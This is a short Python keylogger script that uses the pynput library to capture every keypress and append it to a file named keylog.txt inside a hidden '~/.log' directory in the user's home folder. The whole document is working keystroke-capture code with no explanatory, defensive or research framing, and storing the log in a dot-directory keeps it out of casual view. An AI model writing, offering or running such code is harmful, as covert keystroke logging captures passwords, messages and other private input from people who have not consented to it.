import os
from pynput import keyboard

log_dir = os.path.expanduser('~/.log')
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, "keylog.txt")

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"Key {key.char}\n")
        except AttributeError:
            f.write('special key {} pressed\n'.format(key))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()